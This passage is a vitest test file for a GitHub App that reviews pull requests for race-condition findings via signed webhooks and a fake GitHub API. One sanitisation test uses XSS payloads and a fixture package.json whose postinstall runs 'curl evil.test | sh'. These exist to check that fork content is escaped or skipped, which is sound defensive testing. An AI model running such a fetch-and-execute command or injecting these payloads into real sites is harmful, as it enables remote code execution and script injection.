// The GitHub App end to end, through the worker's real handler: signed webhook deliveries in, calls to a fake GitHub
// out, with the D1 migrations under node:sqlite (docs/github-app/README.md; src/github/*).
import { beforeEach, describe, expect, it } from "vitest";
import { handle } from "../src/collector.js";
import { limitedFor, publicDownloadUrl } from "../src/github/api.js";
import { verifyGithubSignature } from "../src/github/http.js";
import { parseState } from "../src/github/review.js";
import { githubRetention, prRow, REVIEWS_PER_HOUR, takeLease } from "../src/github/store.js";
import { advance, call, createApp, detection, now, ORIGIN, resetClock, sendBatch, setPlan, signedIn } from "./account-helpers.js";
import {
  API,
  APP_ID,
  commentEvent,
  deliver,
  fakeGithub,
  githubSetup,
  INSTALLATION,
  installationCreated,
  OWNER,
  PRIVATE_KEY_PKCS8,
  pullEvent,
  pullRequest,
  raceFile,
  races,
  racesZip,
  REPO,
  result,
  runEvent,
  SHA1,
  SHA2,
  SHA3,
  signature,
  STORAGE,
  WEBHOOK_SECRET,
} from "./github-helpers.js";

beforeEach(() => {
  resetClock();
});

/** An installation, a pull request opened at SHA1, and its test run finished with the fixtures uploaded. */
async function reviewed(over: Parameters<typeof githubSetup>[0] = {}, settings?: string) {
  const s = githubSetup(over);
  const gh = fakeGithub();
  if (settings !== undefined) gh.settings.set(REPO.full_name, settings);
  await deliver(s.env, "installation", installationCreated(), { fetch: gh.fetch });
  expect(await result(await pullRequest(s.env, gh, "opened", 12, SHA1))).toBe("no race files");
  const run = gh.addRun(SHA1);
  const r = await deliver(s.env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
  return { ...s, gh, run, after: await result(r) };
}

describe("github app: the webhook (docs/github-app/README.md, \"Security\")", () => {
  it("GitHub's documented test vector passes the signature check, and nothing else does", async () => {
    const body = new TextEncoder().encode("Hello, World!");
    const good = "sha256=757107ea0eb2509fc211221cce984b8a37570b6d7586c22c46f4379c8b043e17";
    expect(await verifyGithubSignature(body, good, "It's a Secret to Everybody")).toBe(true);
    expect(await verifyGithubSignature(body, good, "It's a Secret to Everybody!")).toBe(false);
    expect(await verifyGithubSignature(new TextEncoder().encode("Hello, World?"), good, "It's a Secret to Everybody")).toBe(false);
    for (const bad of [null, "", "sha256=", "sha1=757107ea0eb2509fc211221cce984b8a37570b6d", good.toUpperCase(), `${good}00`, good.replace("sha256=", "")]) {
      expect(await verifyGithubSignature(body, bad, "It's a Secret to Everybody"), String(bad)).toBe(false);
    }
    expect(await verifyGithubSignature(body, good, "")).toBe(false);
  });

  it("without the app's secrets the webhook answers 503, its pages are not this worker's, and nothing else changes", async () => {
    const { env, sql } = githubSetup({ GITHUB_APP_ID: undefined });
    const r = await deliver(env, "installation", installationCreated());
    expect(r.status).toBe(503);
    expect(sql.rows("SELECT * FROM github_installations")).toEqual([]);
    for (const path of ["/github", "/github/setup", "/github/install", "/github/connect"]) expect((await call(env, "GET", path)).status, path).toBe(404);
    expect((await call(env, "GET", "/api/account/github")).status).toBe(404);
    expect((await call(env, "GET", "/v1/health")).status).toBe(200);
    expect((await call(env, "GET", "/login")).status).toBe(200);
  });

  it("a delivery without a valid signature is refused before anything is parsed or stored", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const payload = JSON.stringify(installationCreated());
    for (const header of [null, "sha256=" + "0".repeat(64), await signature(payload, "another-secret-0123456789"), await signature(`${payload} `)]) {
      const r = await deliver(env, "installation", payload, { fetch: gh.fetch, header });
      expect(r.status).toBe(401);
    }
    expect(sql.rows("SELECT * FROM github_installations")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_deliveries")).toEqual([]);
    expect(gh.calls).toEqual([]);
    // signed, but not JSON or without a delivery id
    expect((await deliver(env, "installation", "{not json", { fetch: gh.fetch })).status).toBe(400);
    expect((await deliver(env, "installation", payload, { fetch: gh.fetch, id: "x" })).status).toBe(400);
    expect((await handle(new Request(`${ORIGIN}/api/github/webhook`, { method: "GET" }), env, { now })).status).toBe(405);
  });

  it("a delivery id is handled once; an event the app does not take is acknowledged and ignored", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const id = "11111111-2222-4333-8444-555555555555";
    expect(await result(await deliver(env, "installation", installationCreated(), { fetch: gh.fetch, id }))).toBe("created");
    const again = await deliver(env, "installation", installationCreated({ account: { ...OWNER, login: "renamed" } }), { fetch: gh.fetch, id });
    expect(await again.json()).toEqual({ ok: true, duplicate: true });
    expect(sql.rows("SELECT account_login FROM github_installations")).toEqual([{ account_login: "acme" }]);
    for (const event of ["push", "star", "marketplace_purchase", "pull_request_review"]) {
      expect(await result(await deliver(env, event, { action: "created" }, { fetch: gh.fetch })), event).toBe("ignored");
    }
    expect(await result(await deliver(env, "ping", { zen: "Keep it logically awesome." }, { fetch: gh.fetch }))).toBe("pong");
    expect(await result(await deliver(env, "github_app_authorization", { action: "revoked" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(sql.rows("SELECT COUNT(*) AS n FROM github_deliveries")[0]!.n).toBe(3);
  });

  it("in production the answer comes first and the work runs after it; a job that fails forgets its delivery so a redelivery runs", async () => {
    const { env, sql } = githubSetup();
    let down = true;
    const gh = fakeGithub({ answer: (c) => (down && c.path.includes("/access_tokens") ? new Response("{}", { status: 502 }) : undefined) });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    const jobs: Promise<unknown>[] = [];
    const id = "aaaaaaaa-2222-4333-8444-555555555555";
    const r = await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id, waitUntil: (p) => jobs.push(p) });
    expect(r.status).toBe(202);
    expect(await r.json()).toEqual({ ok: true, queued: true });
    expect(jobs).toHaveLength(1);
    expect(await jobs[0]).toBe("failed: server");
    expect(sql.rows("SELECT id FROM github_deliveries WHERE id = ?", id)).toEqual([]);
    // the lease was let go, so the redelivery (the same id) reviews the pull request
    down = false;
    expect(await result(await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id }))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
  });
});

describe("github app: installations", () => {
  it("created, suspended, unsuspended, repositories removed, deleted: the rows follow, and an uninstall leaves nothing", async () => {
    const { env, sql, gh } = await reviewed();
    expect(sql.rows("SELECT id, account_id, account_login, account_type, selection, owner, suspended FROM github_installations")).toEqual([
      { id: INSTALLATION, account_id: OWNER.id, account_login: "acme", account_type: "Organization", selection: "selected", owner: null, suspended: null },
    ]);
    expect(sql.rows("SELECT number FROM github_prs")).toEqual([{ number: 12 }]);

    await deliver(env, "installation", { ...installationCreated(), action: "suspend" }, { fetch: gh.fetch });
    expect(sql.rows("SELECT suspended FROM github_installations")[0]!.suspended).not.toBeNull();
    const before = gh.calls.length;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("suspended");
    expect(gh.calls.length).toBe(before);
    await deliver(env, "installation", { ...installationCreated(), action: "unsuspend" }, { fetch: gh.fetch });
    expect(sql.rows("SELECT suspended FROM github_installations")[0]!.suspended).toBeNull();

    await deliver(env, "installation_repositories", { action: "removed", installation: { id: INSTALLATION }, repository_selection: "selected", repositories_removed: [{ id: REPO.id }], repositories_added: [] }, { fetch: gh.fetch });
    expect(sql.rows("SELECT * FROM github_prs")).toEqual([]);

    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(sql.rows("SELECT number FROM github_prs")).toEqual([{ number: 13 }]);
    await deliver(env, "installation", { ...installationCreated(), action: "deleted" }, { fetch: gh.fetch });
    for (const t of ["github_installations", "github_repos", "github_prs", "github_usage"]) expect(sql.rows(`SELECT * FROM ${t}`), t).toEqual([]);
  });

  it("an event for an installation whose created event never arrived records it from the event itself", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(sql.rows("SELECT id, account_login FROM github_installations")).toEqual([{ id: INSTALLATION, account_login: "acme" }]);
  });
});

describe("github app: reviewing a pull request", () => {
  it("opened with no test run yet: one neutral check that says how to set it up, no comment, and only the calls it needs", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(gh.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      `POST /app/installations/${INSTALLATION}/access_tokens`,
      "GET /repos/acme/shop/contents/.github/genclass.yml",
      "GET /repos/acme/shop/actions/runs",
      "POST /repos/acme/shop/check-runs",
    ]);
    // the token was asked for this repository only
    expect(gh.calls[0]!.body).toEqual({ repository_ids: [REPO.id] });
    const [check] = gh.checksAt(SHA1);
    expect(check).toMatchObject({ name: "GenClass", status: "completed", conclusion: "neutral" });
    expect(check.output.title).toBe("No race files for this commit");
    expect(check.output.summary).toContain("No race files for `1111111`.");
    expect(gh.posted(12)).toEqual([]);
  });

  it("the test run finishes: the artifact is read without credentials going to storage, and the comment and check say what was flagged", async () => {
    const { gh, after, sql } = await reviewed();
    expect(after).toBe("findings");
    // the storage host got no Authorization header
    expect(gh.storage).toHaveLength(1);
    expect(gh.storage[0]!.url.startsWith(`${STORAGE}/a/`)).toBe(true);
    expect(gh.storage[0]!.headers.authorization).toBeUndefined();
    const body = gh.summary(12)!;
    expect(body).toContain("**2 findings** in this pull request's tests at `1111111` · 1 reproducible · 2 tests read");
    expect(body).toContain("| 1 | New | Duplicate submit · `POST /api/orders` |");
    expect(body).toContain("| 2 | New | Stale response · `GET /api/search` |");
    expect(body).toContain("genclass-dev[bot] read 4 race files from the artifact `genclass-races`");
    // the same check run on that commit was updated, not a second one added
    const checks = gh.checksAt(SHA1);
    expect(checks).toHaveLength(1);
    expect(checks[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(checks[0].output.title).toBe("2 findings, 1 reproducible");
    expect(checks[0].output.text).toContain("#### Race report");
    const row = sql.rows("SELECT head_sha, comment_id, check_run_id, reviews, lease, pending FROM github_prs")[0]!;
    expect(row).toMatchObject({ head_sha: SHA1, reviews: 2, lease: null, pending: 0 });
    expect(row.comment_id).toBeGreaterThan(0);
    // every repository call carried a token minted for this repository
    expect(gh.apiCalls().every((c) => gh.tokens.has(c.auth.replace("Bearer ", "")))).toBe(true);
    expect(gh.calls.filter((c) => c.path.includes("/access_tokens"))).toHaveLength(1);
  });

  it("a run without race files starts nothing; the same evidence read again writes nothing", async () => {
    const { env, gh, sql } = await reviewed();
    const other = gh.addRun(SHA1, { "playwright-report": racesZip() }, { name: "lint", workflow_id: 2 });
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(other.id, SHA1), { fetch: gh.fetch }))).toBe("no race files in this run");
    expect(gh.calls.slice(before).map((c) => `${c.method} ${c.path}`)).toEqual([`GET /repos/acme/shop/actions/runs/${other.id}/artifacts`]);
    expect(await result(await deliver(env, "workflow_run", runEvent(999, "f".repeat(40)), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    // the first run delivered again under a new id (a re-run): read, compared, nothing written
    const run = gh.runs.get(REPO.full_name)![0]!;
    const mark = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    const writes = gh.calls.slice(mark).filter((c) => c.method !== "GET");
    expect(writes).toEqual([]);
    expect(gh.posted(12)).toHaveLength(1);
    expect(sql.rows("SELECT reviews FROM github_prs")[0]!.reviews).toBe(3);
  });

  it("the next push: the same comment is edited, a new check goes on the new commit, and the findings keep their numbers", async () => {
    const { env, gh, sql } = await reviewed();
    const commentId = sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id;
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(gh.summary(12)).toContain("No race files for `2222222`.");
    expect(gh.summary(12)).toContain("| 1 | New | Duplicate submit");
    // the new commit's run: checkout ran clean, search is still flagged, and the cart test flags something new
    const t = "checkout.spec.ts > checkout > places one order";
    const run = gh.addRun(SHA2, {
      "genclass-races": racesZip({ "a.json": races(t, 1, []), "b.json": races(t, 2, []), "c.json": raceFile("search-1.json"), "d.json": raceFile("search-2.json"), "e.json": races("cart.spec.ts > cart > adds", 1, [{ diagnosis: "failing", op: "GET /api/cart", trigger: "failure" }]) }),
    });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.posted(12)).toHaveLength(1);
    expect(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id).toBe(commentId);
    const body = gh.summary(12)!;
    expect(body).toContain("**2 findings** in this pull request's tests at `2222222` · 0 reproducible · 1 new · 1 not flagged now · 3 tests read");
    expect(body).toContain("| 3 | New | Failing endpoint · `GET /api/cart` |");
    expect(body).toContain("| 2 | Still flagged | Stale response · `GET /api/search` |");
    expect(body).toContain("| 1 | Not flagged now | Duplicate submit · `POST /api/orders` | checkout.spec.ts > checkout > places one order | last flagged at `1111111` |");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0].output.title).toBe("2 findings, 0 reproducible");
    // a clean third commit: the comment says so (it is not deleted), the check succeeds
    await pullRequest(env, gh, "synchronize", 12, SHA3);
    const clean = gh.addRun(SHA3, { "genclass-races": racesZip({ "a.json": races(t, 1, []), "c.json": raceFile("search-1.json"), "e.json": races("cart.spec.ts > cart > adds", 1, []) }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(clean.id, SHA3), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.summary(12)).toContain("**Nothing flagged** in 3 tests at `3333333` · 3 earlier findings not flagged now");
    expect(gh.checksAt(SHA3)[0]).toMatchObject({ conclusion: "success" });
    expect(gh.posted(12)).toHaveLength(1);
  });

  it("nothing flagged from the start is a successful check and no comment at all", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.posted(12)).toEqual([]);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ conclusion: "success" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("Nothing flagged in 1 test");
  });

  it("a pull request from a fork is reviewed the same way, from the artifact its run uploaded", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    const fork = { head: { sha: SHA1, ref: "patch-1", repo: { id: 99001, full_name: "mallory/shop" } } };
    await pullRequest(env, gh, "opened", 14, SHA1, fork);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.summary(14)).toContain("**2 findings**");
  });

  it("what a fork puts in its race files is shown as text: no markup, no mention, no link, and files that are not race files are listed as skipped", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await pullRequest(env, gh, "opened", 15, SHA1);
    const evil = "x.spec.ts > <img src=x onerror=alert(1)> [click](https://evil.test) @octocat closes #1";
    const run = gh.addRun(SHA1, {
      "genclass-races": racesZip({
        "one.json": races(evil, 1, [{ diagnosis: "duplicate", op: "POST /api/a", evidence: "<script>alert(1)</script> ping @acme/owners" }]),
        "two.json": races(evil, 2, [{ diagnosis: "duplicate", op: "POST /api/a" }]),
        "package.json": '{"name":"not-a-race-file","scripts":{"postinstall":"curl evil.test | sh"}}',
        "notes.txt": "ignored: not json",
      }),
    });
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    const body = gh.summary(15)!;
    const prose = body.replace(/`+[^`\n]*`+/g, "");
    expect(prose).not.toMatch(/(?<!\\)<(?!\/?(details|summary|sub)>|!-- genclass-bot)/);
    expect(body).not.toMatch(/@octocat|@acme\/owners/);
    expect(body).not.toContain("[click](https://evil.test)");
    expect(body).toContain("##### Files skipped (1)");
    expect(body).toContain("`genclass-races/package.json`");
    expect(body).not.toContain("postinstall");
    expect(body).not.toContain("notes.txt");
  });

  it("settings come from the default branch: comment never, check off, automatic reviews off, drafts, base branches, authors", async () => {
    const quiet = await reviewed({}, "comment: never\n");
    expect(quiet.gh.posted(12)).toEqual([]);
    expect(quiet.gh.checksAt(SHA1)[0].output.title).toBe("2 findings, 1 reproducible");

    const noCheck = await reviewed({}, "check: false\n");
    expect(noCheck.gh.checksAt(SHA1)).toEqual([]);
    expect(noCheck.gh.summary(12)).toContain("**2 findings**");

    const off = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "reviews:\n  auto: false\n");
    gh.addRun(SHA1);
    expect(await result(await pullRequest(off.env, gh, "opened", 12, SHA1))).toBe("automatic reviews are off");
    expect(gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("access_tokens"))).toEqual([]);

    const s = githubSetup();
    const g = fakeGithub();
    g.settings.set(REPO.full_name, 'reviews:\n  branches: [main, "release/*"]\n  ignore_authors: ["Dependabot[bot]"]\n');
    expect(await result(await pullRequest(s.env, g, "opened", 20, SHA1, { draft: true }))).toBe("draft");
    expect(await result(await pullRequest(s.env, g, "ready_for_review", 20, SHA1))).toBe("no race files");
    expect(await result(await pullRequest(s.env, g, "opened", 21, SHA2, { base: { ref: "experiment", repo: { id: REPO.id } } }))).toBe("base branch not reviewed");
    expect(await result(await pullRequest(s.env, g, "opened", 22, SHA2, { base: { ref: "release/2.0", repo: { id: REPO.id } } }))).toBe("no race files");
    expect(await result(await pullRequest(s.env, g, "opened", 23, SHA3, { user: { id: 5, login: "dependabot[bot]", type: "Bot" } }))).toBe("author not reviewed");
    // the file was asked for once and then served from the cache for two minutes
    expect(g.calls.filter((c) => c.path.endsWith("/contents/.github/genclass.yml"))).toHaveLength(1);
    advance(121_000);
    await pullRequest(s.env, g, "synchronize", 22, SHA3);
    expect(g.calls.filter((c) => c.path.endsWith("/contents/.github/genclass.yml"))).toHaveLength(2);
  });

  it("a settings file with a mistake does not stop the review: the defaults apply and the check says what is wrong", async () => {
    const { gh } = await reviewed({}, "comment: loud\nmin_seeds: 1\nfoo: bar\n");
    const check = gh.checksAt(SHA1)[0];
    expect(check.output.summary).toContain("**Settings**");
    expect(check.output.summary).toContain("foo is not a setting; it was ignored.");
    expect(check.output.summary).toContain("comment must be one of findings, always, never; using findings.");
    // min_seeds: 1 was valid and applied: both findings are reproducible now
    expect(check.output.title).toBe("2 findings, 2 reproducible");
    const broken = await reviewed({}, "reviews: [\n");
    expect(broken.gh.checksAt(SHA1)[0].output.summary).toMatch(/\.github\/genclass\.yml could not be read \(line 1: /);
    expect(broken.gh.summary(12)).toContain("**2 findings**");
  });

  it("fail_on: the check waits in progress for the test run and fails on a reproducible finding", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "check:\n  fail_on: reproducible\n");
    gh.runs.set(REPO.full_name, [{ id: 5001, head_sha: SHA1, status: "in_progress", conclusion: null }]);
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "in_progress" });
    expect(gh.checksAt(SHA1)[0].conclusion).toBeUndefined();
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).waiting).toBe(SHA1);
    // a run without race files finishes: the check is waiting, so the review runs and finds the other run still going
    gh.runs.get(REPO.full_name)!.push({ id: 5002, head_sha: SHA1, name: "lint", workflow_id: 2 });
    expect(await result(await deliver(env, "workflow_run", runEvent(5002, SHA1), { fetch: gh.fetch }))).toBe("waiting for the test run");
    const run = gh.runs.get(REPO.full_name)![0]!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = { "genclass-races": racesZip() };
    expect(await result(await deliver(env, "workflow_run", runEvent(5001, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).waiting).toBeNull();
  });

  it("fail_on: a push that GitHub reports before its workflow runs exist waits too, and a person's review ends the wait", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "check:\n  fail_on: any\n");
    // no workflow run exists yet for the commit
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "in_progress" });
    expect(gh.checksAt(SHA1)[0].output.title).toBe("Waiting for this commit's test run");
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).waiting).toBe(SHA1);
    // the run arrives with nothing flagged: the same check completes, green
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "c.json": raceFile("search-1.json") }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("nothing flagged");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "success" });
    // a commit that starts no workflow at all: it waits, until someone asks
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch }))).toBe("no race files");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("No race files for this commit");
    // without fail_on nothing waits: the default never holds a pull request up
    const plain = githubSetup();
    const g2 = fakeGithub();
    expect(await result(await pullRequest(plain.env, g2, "opened", 12, SHA1))).toBe("no race files");
    expect(g2.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
  });

  it("an inline comment goes on the test's line when the diff shows it, once", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    const t = "checkout.spec.ts > checkout > places one order";
    const loc = { location: { file: "tests/checkout.spec.ts", line: 12 } };
    gh.files.set(`${REPO.full_name}#12`, [
      { filename: "tests/checkout.spec.ts", status: "modified", patch: "@@ -8,6 +8,9 @@ test.describe\n ctx\n+test('places one order', async () => {\n+});\n" },
      { filename: "src/cart.ts", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" },
    ]);
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "a.json": races(t, 1, [{ diagnosis: "duplicate", op: "POST /api/orders" }], loc), "b.json": races(t, 2, [{ diagnosis: "duplicate", op: "POST /api/orders" }], loc) }) });
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]!.body).toMatchObject({ commit_id: SHA1, event: "COMMENT", comments: [{ path: "tests/checkout.spec.ts", line: 12, side: "RIGHT" }] });
    expect(gh.reviews[0]!.body.comments[0].body).toContain("**GenClass, finding 1**: Duplicate submit on `POST /api/orders`");
    // read again, and pushed again with the finding still there: no second inline comment
    await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const again = gh.addRun(SHA2, run.artifacts);
    await deliver(env, "workflow_run", runEvent(again.id, SHA2), { fetch: gh.fetch });
    expect(gh.reviews).toHaveLength(1);
    // without a location in the files, the changed files are not even listed
    const plain = await reviewed();
    expect(plain.gh.calls.some((c) => c.path.endsWith("/files"))).toBe(false);
    expect(plain.gh.reviews).toEqual([]);
  });

  it("a comment someone deleted comes back only when there is a new finding to tell them about", async () => {
    const { env, gh, sql } = await reviewed();
    const id = Number(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id);
    gh.deletedComments.add(id);
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const same = gh.addRun(SHA2);
    await deliver(env, "workflow_run", runEvent(same.id, SHA2), { fetch: gh.fetch });
    expect(gh.summary(12)).toBeNull();
    expect(sql.rows("SELECT comment_id FROM github_prs")[0]!.comment_id).toBeNull();
    await pullRequest(env, gh, "synchronize", 12, SHA3);
    const more = gh.addRun(SHA3, { "genclass-races": racesZip({ "a.json": raceFile("checkout-1.json"), "b.json": raceFile("checkout-2.json"), "n.json": races("new.spec.ts > n", 1, [{ diagnosis: "stale", op: "GET /api/new" }]) }) });
    await deliver(env, "workflow_run", runEvent(more.id, SHA3), { fetch: gh.fetch });
    expect(gh.summary(12)).toContain("| 3 | New | Stale response · `GET /api/new` |");
  });

  it("closed: the row is kept for a reopen; merged with `issues: merge` and a reproducible finding: one issue", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    const closed = pullEvent("closed", 12, SHA1, { state: "closed", merged: true });
    expect(await result(await deliver(env, "pull_request", closed, { fetch: gh.fetch }))).toBe("issue opened");
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).not.toBeNull();
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Duplicate submit on POST /api/orders (GenClass, from #12)");
    expect(gh.issues[0]!.body).toContain("Pull request #12 was merged with 1 finding");
    expect(await result(await deliver(env, "pull_request", closed, { fetch: gh.fetch }))).toBe("closed");
    expect(gh.issues).toHaveLength(1);
    // the default never opens one, and a pull request closed without merging does not either
    const plain = await reviewed();
    expect(await result(await deliver(plain.env, "pull_request", closed, { fetch: plain.gh.fetch }))).toBe("closed");
    expect(plain.gh.issues).toEqual([]);
    const unmerged = await reviewed({}, "issues: merge\n");
    await pullRequest(unmerged.env, unmerged.gh, "closed", 12, SHA1, { state: "closed", merged: false });
    expect(unmerged.gh.issues).toEqual([]);
  });

  it("a reopened pull request is open again for its test runs, and a check is only ever updated on its own commit", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "closed", 12, SHA1, { state: "closed" });
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).not.toBeNull();
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(gh.runs.get(REPO.full_name)![0]!.id, SHA1), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    expect(gh.calls.length).toBe(before);
    expect(await result(await pullRequest(env, gh, "reopened", 12, SHA1))).toBe("findings");
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).toBeNull();
    expect(await result(await deliver(env, "workflow_run", runEvent(gh.runs.get(REPO.full_name)![0]!.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    // the check is turned off, a commit goes by without one, and it is turned on again: the new commit gets its own
    gh.settings.set(REPO.full_name, "check: false\n");
    advance(121_000);
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    expect(gh.checksAt(SHA2)).toEqual([]);
    expect(sql.rows("SELECT check_run_id FROM github_prs")[0]!.check_run_id).toBeNull();
    gh.settings.delete(REPO.full_name);
    advance(121_000);
    const patches = () => gh.calls.filter((c) => c.method === "PATCH" && c.path.includes("/check-runs/")).length;
    const was = patches();
    await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch });
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(patches()).toBe(was);
  });

  it("re-running the check from GitHub's page reviews again, and only the app's own check counts", async () => {
    const { env, gh } = await reviewed();
    const rerun = (appId: number, sha = SHA1) => ({ action: "rerequested", check_run: { id: 1, head_sha: sha, app: { id: appId } }, repository: REPO, installation: { id: INSTALLATION } });
    const before = gh.calls.length;
    expect(await result(await deliver(env, "check_run", rerun(1), { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "check_run", { ...rerun(Number(APP_ID)), action: "created" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(gh.calls.length).toBe(before);
    expect(await result(await deliver(env, "check_run", rerun(Number(APP_ID)), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.calls.length).toBeGreaterThan(before);
    expect(await result(await deliver(env, "check_run", rerun(Number(APP_ID), SHA3), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    // asked for by a person, it runs even where automatic reviews are off
    const off = githubSetup();
    const g = fakeGithub();
    g.settings.set(REPO.full_name, "reviews: false\n");
    expect(await result(await pullRequest(off.env, g, "opened", 12, SHA1))).toBe("automatic reviews are off");
    expect(g.checksAt(SHA1)).toEqual([]);
    off.sql.db.prepare("UPDATE github_prs SET head_sha = ?").run(SHA1);
    expect(await result(await deliver(off.env, "check_run", rerun(Number(APP_ID)), { fetch: g.fetch }))).toBe("no race files");
    expect(g.checksAt(SHA1)).toHaveLength(1);
  });
});

describe("github app: limits", () => {
  it("one review at a time per pull request: an event that arrives meanwhile is picked up by the review that is running", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    // another review holds the lease
    await takeLease(env.DB!, { repoId: REPO.id, number: 12, installationId: INSTALLATION }, now());
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("busy");
    expect(gh.calls).toEqual([]);
    expect(sql.rows("SELECT pending FROM github_prs")[0]!.pending).toBe(1);
    // a lease that was never let go (a worker that died) is taken over after a minute
    advance(61_000);
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA1))).toBe("no race files");
    expect(sql.rows("SELECT lease, pending FROM github_prs")[0]).toEqual({ lease: null, pending: 0 });
  });

  it("a review that is running goes round once more when something arrived while it ran", async () => {
    const { env } = githubSetup();
    let mark: (() => Promise<void>) | null = null;
